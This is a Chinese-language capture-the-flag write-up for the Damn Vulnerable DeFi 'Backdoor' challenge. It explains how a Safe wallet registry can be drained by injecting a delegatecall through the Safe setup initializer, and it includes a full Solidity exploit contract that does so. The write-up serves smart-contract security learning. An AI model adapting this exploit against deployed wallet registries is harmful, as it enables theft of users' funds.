### Backdoor

[題目](https://www.damnvulnerabledefi.xyz/challenges/backdoor/): 為了激勵團隊成員創建更安全的錢包，有人部署了一個Safe錢包的註冊表。當團隊中的某個人部署並註冊一個錢包時，他們會獲得10個DVT代幣。這個註冊表與合法的Safe代理工廠（Safe Proxy Factory）緊密集成，並且包括嚴格的安全檢查。目前，有四個人被註冊為受益人：Alice、Bob、Charlie和David。註冊表中有40個DVT代幣餘額，準備分配給他們。找出註冊表中的漏洞，救出所有資金，並將它們存入指定的回收賬戶。並且在一次交易中完成。

過關條件:
- 只執行了一次交易
- 所有被列為受益人的用戶都必須已經在註冊表中註冊了一個錢包地址
- 用戶不再是受益人
- 所有代幣都被轉移到 recovery 錢包

解題:
- Safe = singletonCopy, SafeProxyFactory = walletFactory
- create a new Safe wallet: SafeProxyFactory.createProxyWithCallback -> createProxyWithNonce -> deployProxy -> ( if callback is defined ) callback.proxyCreated
- 題目有4位受益人, 透過 WalletRegustry 建立合錢包每一位會拿到10ETH. 在 function proxyCreated 的備註提到建立錢包是透過 SafeProxyFactory::createProxyWithCallback, 可以從以下看到 createProxyWithCallback的code. 
```
     * @notice Function executed when user creates a Safe wallet via SafeProxyFactory::createProxyWithCallback
     *          setting the registry's address as the callback.
    function proxyCreated

    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (SafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }
```
- 在 initializer 最後在 deployProxy 執行,且是我們可以控制的, call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0). 所以我們可以在initializer中執行 Safe.setup, 然後控制第三個欄位 to, Contract address for optional delegate call. 指定一個任意合約或有後門的合約. 最後在第4個欄位data 可以執行 Data payload for optional delegate call.搭配以上流程就可以拿到每一個受益人的ETH.
```
    function setup(
        address[] calldata _owners, //List of Safe owners.
        uint256 _threshold, //Number of required confirmations for a Safe transaction.
        address to, //   Contract address for optional delegate call.
        bytes calldata data, //Data payload for optional delegate call.
        address fallbackHandler
    ) 
```

[POC](./damn-vulnerable-defi/test/backdoor/Backdoor.t.sol) :
```
    function test_backdoor() public checkSolvedByPlayer {
             Exploit exploit = new Exploit(address(singletonCopy),address(walletFactory),address(walletRegistry),address(token),recovery);
             exploit.attack(users);
    }
contract Exploit {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token,
        address _recovery
    ) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        // For every registered user we'll create a wallet
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the data that will be passed to the proxyCreated function on WalletRegistry
            // The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
        SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
         singletonCopy,  // _singleton => Address of singleton contract.
         _initializer,   // initializer => Payload for message call sent to new proxy contract.
         i,              // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
         IProxyCreationCallback(walletRegistry)  // callback => Cast walletRegistry to IProxyCreationCallback
);
            //Transfer to caller
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}
```
